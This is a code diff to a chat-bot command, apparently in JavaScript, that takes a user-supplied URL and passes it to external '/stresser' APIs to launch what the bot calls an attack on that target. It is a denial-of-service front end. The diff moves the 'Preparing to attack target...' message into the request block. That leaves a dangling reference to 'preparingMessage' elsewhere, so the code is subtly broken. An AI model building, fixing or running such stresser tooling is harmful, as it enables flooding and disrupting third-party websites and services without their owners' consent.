@@ -22,10 +22,7 @@ module.exports.run = async ({ args, chat, font }) => {
     return chat.reply(font.thin("Please provide a URL to attack!"));
   }
 
-  const preparingMessage = await chat.reply(
-    font.bold("Preparing to attack target...")
-  );
-
+ 
   const tryAttack = async (apis, index = 0) => {
     if (index >= apis.length) {
       await preparingMessage.delete();
@@ -38,19 +35,23 @@ module.exports.run = async ({ args, chat, font }) => {
 
 
 
-    try {
+    try { 
 
       let response;
 
       const helonegaownersv2 = targetUrl.toLowerCase() === "stop";
 
       if (!helonegaownersv2) {
+        const preparingMessage = await chat.reply(
+          font.bold("Preparing to attack target...")
+        );
         response = await axios.get(
           `${apis[index]}/stresser?url=${encodeURIComponent(targetUrl)}`,
           {
             timeout: 10000,
           }
         );
+        preparingMessage.delete();
       }
 
       if (helonegaownersv2) {
@@ -63,7 +64,6 @@ module.exports.run = async ({ args, chat, font }) => {
 
       }
 
-      await preparingMessage.delete();
       await chat.reply(
         font.thin(response.data.message || "Attack initiated successfully!")
       );
